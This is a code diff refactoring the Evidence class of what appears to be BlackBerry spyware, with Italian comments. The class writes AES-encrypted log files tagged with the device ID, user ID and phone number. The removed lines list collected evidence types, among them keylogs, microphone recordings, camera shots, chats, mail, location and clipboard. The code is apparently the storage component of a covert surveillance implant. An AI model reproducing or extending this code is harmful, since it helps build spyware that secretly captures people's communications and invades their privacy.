@@ -18,7 +18,7 @@ import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
-import blackberry.agent.Agent;
+import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -67,37 +67,7 @@ public final class Evidence {
      * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
      */
 
-    public static final int E_MAGIC_CALLTYPE = 0x0026;
-
     public static int E_DELIMITER = 0xABADC0DE;
-
-    public static final int[] TYPE_E = new int[] {
-            EvidenceType.INFO,
-            EvidenceType.MAIL_RAW,
-            EvidenceType.ADDRESSBOOK,
-            EvidenceType.CALLLIST, // 0..3
-            EvidenceType.DEVICE,
-            EvidenceType.LOCATION,
-            EvidenceType.CALL,
-            EvidenceType.CALL_MOBILE, // 4..7
-            EvidenceType.KEYLOG, EvidenceType.SNAPSHOT,
-            EvidenceType.URL,
-            EvidenceType.CHAT, // 8..b
-            EvidenceType.MAIL, EvidenceType.MIC, EvidenceType.CAMSHOT,
-            EvidenceType.CLIPBOARD, // c..f
-            EvidenceType.NONE, EvidenceType.APPLICATION, // 10..11
-            EvidenceType.NONE // 12
-    };
-
-    public static final String[] MEMO_TYPE_E = new String[] { "INF",
-            "MAR", "ADD", "CLL", // 0..3
-            "DEV", "LOC", "CAL", "CLM", // 4..7
-            "KEY", "SNP", "URL", "CHA", // 8..b
-            "MAI", "MIC", "CAM", "CLI", // c..f
-            "NON", "APP", // 10..11
-            "NON" // 12
-
-    };
 
     private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
@@ -110,27 +80,72 @@ public final class Evidence {
 
     boolean enoughSpace = true;
 
-    /**
-     * Convert type log.
-     * 
-     * @param agentId
-     *            the agent id
-     * @return the int
-     */
-    public static int convertTypeEvidence(final int agentId) {
-        final int agentPos = agentId - Agent.AGENT;
-        //#ifdef DBC
-        Check.requires(TYPE_E != null, "Null TypeEvidence");
-        //#endif
-        if (agentPos >= 0 && agentPos < TYPE_E.length) {
-            final int typeLog = TYPE_E[agentPos];
-            return typeLog;
-        }
+    Date timestamp;
+    String logName;
 
-        //#ifdef DEBUG
-        debug.warn("Wrong agentId conversion: " + agentId);
+    String fileName;
+    FileConnection fconn = null;
+
+    DataOutputStream os = null;
+    Encryption encryption;
+    EvidenceCollector evidenceCollector;
+
+    EvidenceDescription evidenceDescription;
+    Device device;
+
+    int evidenceId;
+    boolean onSD;
+
+    int progressive;
+
+    private byte[] aesKey;
+    private byte[] encData;
+
+    private int typeEvidenceId;
+
+    /**
+     * Instantiates a new evidence.
+     */
+    private Evidence() {
+        evidenceCollector = EvidenceCollector.getInstance();
+        device = Device.getInstance();
+
+        progressive = -1;
+        // timestamp = new Date();
+    }
+
+    /**
+     * Instantiates a new log.
+     * 
+     * @param typeEvidenceId
+     *            the type evidence id
+     * @param aesKey
+     *            the aes key
+     */
+    private Evidence(final int typeEvidenceId, final byte[] aesKey) {
+        this();
+        //#ifdef DBC
+        Check.requires(aesKey != null, "aesKey null"); //$NON-NLS-1$
         //#endif
-        return EvidenceType.UNKNOWN;
+
+        // agent = agent_;
+        this.typeEvidenceId = typeEvidenceId;
+        this.aesKey = aesKey;
+
+        encryption = new Encryption(aesKey);
+        //#ifdef DBC
+        Check.ensures(encryption != null, "encryption null"); //$NON-NLS-1$
+        //#endif
+    }
+
+    /**
+     * Instantiates a new evidence.
+     * 
+     * @param typeEvidenceId
+     *            the type evidence id
+     */
+    public Evidence(final int typeEvidenceId) {
+        this(typeEvidenceId, Keys.getInstance().getLogKey());
     }
 
     public static String memoTypeEvidence(final int typeId) {
@@ -212,90 +227,6 @@ public final class Evidence {
         return "UNK";
     }
 
-    Date timestamp;
-    String logName;
-
-    int evidenceType;
-
-    String fileName;
-    FileConnection fconn = null;
-
-    DataOutputStream os = null;
-    Encryption encryption;
-    EvidenceCollector evidenceCollector;
-
-    EvidenceDescription evidenceDescription;
-    Device device;
-
-    //Agent agent;
-    int agentId;
-    boolean onSD;
-
-    int progressive;
-
-    private byte[] aesKey;
-    private byte[] encData;
-
-    private Evidence() {
-        evidenceCollector = EvidenceCollector.getInstance();
-        device = Device.getInstance();
-        encryption = new Encryption();
-        progressive = -1;
-        // timestamp = new Date();
-    }
-
-    /**
-     * Instantiates a new log.
-     * 
-     * @param agent_
-     *            the agent_
-     * @param aesKey
-     *            the aes key
-     */
-    public Evidence(final int agentId, final boolean onSD, final byte[] aesKey) {
-        this();
-        //#ifdef DBC        
-        Check.requires(aesKey != null, "aesKey null");
-        Check.requires(encryption != null, "encryption null");
-        //#endif
-
-        //agent = agent_;
-        this.agentId = agentId;
-        this.onSD = onSD;
-        this.aesKey = aesKey;
-
-        encryption.makeKey(aesKey);
-
-        //#ifdef DBC
-        //Check.ensures(agent != null, "createLog: agent null");
-        Check.ensures(encryption != null, "encryption null");
-        //#endif
-    }
-
-    public Evidence(final boolean onSD, final byte[] aesKey) {
-        this();
-        //#ifdef DBC        
-        Check.requires(aesKey != null, "aesKey null");
-        Check.requires(encryption != null, "encryption null");
-        //#endif
-
-        //agent = agent_;
-        this.agentId = -1;
-        this.onSD = onSD;
-        this.aesKey = aesKey;
-
-        encryption.makeKey(aesKey);
-
-        //#ifdef DBC
-        //Check.ensures(agent != null, "createLog: agent null");
-        Check.ensures(encryption != null, "encryption null");
-        //#endif
-    }
-
-    public Evidence(Evidence log) {
-        this(log.agentId, log.onSD, log.aesKey);
-    }
-
     /**
      * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
      * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
@@ -330,8 +261,8 @@ public final class Evidence {
         return ret;
     }
 
-    public synchronized boolean createEvidence(final byte[] additionalData) {
-        return createEvidence(additionalData, convertTypeEvidence(agentId));
+    public synchronized boolean createEvidence() {
+        return createEvidence(null);
     }
 
     /**
@@ -349,10 +280,9 @@ public final class Evidence {
      *            the additional data
      * @return true, if successful
      */
-    public synchronized boolean createEvidence(final byte[] additionalData,
-            final int logType) {
+    public synchronized boolean createEvidence(final byte[] additionalData) {
         //#ifdef DEBUG
-        debug.trace("createLog logType: " + logType);
+        debug.trace("createLog evidenceType: " + typeEvidenceId);
         //#endif
 
         //#ifdef DBC
@@ -377,7 +307,7 @@ public final class Evidence {
         }
 
         final Vector tuple = evidenceCollector.makeNewName(this,
-                memoTypeEvidence(logType), onSD);
+                memoTypeEvidence(typeEvidenceId), onSD);
         //#ifdef DBC
         Check.asserts(tuple.size() == 5, "Wrong tuple size");
         //#endif
@@ -425,7 +355,8 @@ public final class Evidence {
             debug.info("Created: " + fileName);
             //#endif
 
-            final byte[] plainBuffer = makeDescription(additionalData, logType);
+            final byte[] plainBuffer = makeDescription(additionalData,
+                    typeEvidenceId);
             //#ifdef DBC
             Check.asserts(plainBuffer.length >= 32 + additionalLen,
                     "Short plainBuffer");
@@ -491,66 +422,6 @@ public final class Evidence {
         } else {
             return true;
         }
-    }
-
-    // pubblico solo per fare i test
-    /**
-     * Make description.
-     * 
-     * @param additionalData
-     *            the additional data
-     * @return the byte[]
-     */
-    public byte[] makeDescription(final byte[] additionalData, final int logType) {
-
-        if (timestamp == null) {
-            timestamp = new Date();
-        }
-
-        int additionalLen = 0;
-
-        if (additionalData != null) {
-            additionalLen = additionalData.length;
-        }
-
-        final DateTime datetime = new DateTime(timestamp);
-
-        evidenceDescription = new EvidenceDescription();
-        evidenceDescription.version = E_VERSION_01;
-        evidenceDescription.logType = logType;
-        evidenceDescription.hTimeStamp = datetime.hiDateTime();
-        evidenceDescription.lTimeStamp = datetime.lowDateTime();
-        evidenceDescription.additionalData = additionalLen;
-        evidenceDescription.deviceIdLen = device.getWDeviceId().length;
-        evidenceDescription.userIdLen = device.getWUserId().length;
-        evidenceDescription.sourceIdLen = device.getWPhoneNumber().length;
-
-        final byte[] baseHeader = evidenceDescription.getBytes();
-        //#ifdef DBC
-        Check.asserts(baseHeader.length == evidenceDescription.length,
-                "Wrong log len");
-        //#endif
-
-        final int headerLen = baseHeader.length
-                + evidenceDescription.additionalData
-                + evidenceDescription.deviceIdLen
-                + evidenceDescription.userIdLen
-                + evidenceDescription.sourceIdLen;
-        final byte[] plainBuffer = new byte[Encryption
-                .getNextMultiple(headerLen)];
-
-        final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
-                plainBuffer.length, false);
-        databuffer.write(baseHeader);
-        databuffer.write(device.getWDeviceId());
-        databuffer.write(device.getWUserId());
-        databuffer.write(device.getWPhoneNumber());
-
-        if (additionalLen > 0) {
-            databuffer.write(additionalData);
-        }
-
-        return plainBuffer;
     }
 
     public synchronized byte[] plainEvidence(final byte[] additionalData,
@@ -672,10 +543,69 @@ public final class Evidence {
         return writeEvidence(buffer);
     }
 
+    // pubblico solo per fare i test
+    /**
+     * Make description.
+     * 
+     * @param additionalData
+     *            the additional data
+     * @return the byte[]
+     */
+    public byte[] makeDescription(final byte[] additionalData, final int logType) {
+
+        if (timestamp == null) {
+            timestamp = new Date();
+        }
+
+        int additionalLen = 0;
+
+        if (additionalData != null) {
+            additionalLen = additionalData.length;
+        }
+
+        final DateTime datetime = new DateTime(timestamp);
+
+        evidenceDescription = new EvidenceDescription();
+        evidenceDescription.version = E_VERSION_01;
+        evidenceDescription.logType = logType;
+        evidenceDescription.hTimeStamp = datetime.hiDateTime();
+        evidenceDescription.lTimeStamp = datetime.lowDateTime();
+        evidenceDescription.additionalData = additionalLen;
+        evidenceDescription.deviceIdLen = device.getWDeviceId().length;
+        evidenceDescription.userIdLen = device.getWUserId().length;
+        evidenceDescription.sourceIdLen = device.getWPhoneNumber().length;
+
+        final byte[] baseHeader = evidenceDescription.getBytes();
+        //#ifdef DBC
+        Check.asserts(baseHeader.length == evidenceDescription.length,
+                "Wrong log len");
+        //#endif
+
+        final int headerLen = baseHeader.length
+                + evidenceDescription.additionalData
+                + evidenceDescription.deviceIdLen
+                + evidenceDescription.userIdLen
+                + evidenceDescription.sourceIdLen;
+        final byte[] plainBuffer = new byte[Encryption
+                .getNextMultiple(headerLen)];
+
+        final DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
+                plainBuffer.length, false);
+        databuffer.write(baseHeader);
+        databuffer.write(device.getWDeviceId());
+        databuffer.write(device.getWUserId());
+        databuffer.write(device.getWPhoneNumber());
+
+        if (additionalLen > 0) {
+            databuffer.write(additionalData);
+        }
+
+        return plainBuffer;
+    }
+
     public static void info(final String message) {
         try {
-            final Evidence logInfo = new Evidence(Agent.AGENT_INFO, false,
-                    Encryption.getKeys().getAesKey());
+            final Evidence logInfo = new Evidence(EvidenceType.INFO);
 
             logInfo.atomicWriteOnce(message);
 
@@ -711,10 +641,4 @@ public final class Evidence {
         close();
     }
 
-    public void atomicWriteOnce(byte[] additionalData, int logType,
-            byte[] content) {
-        createEvidence(additionalData, logType);
-        writeEvidence(content);
-        close();
-    }
 }
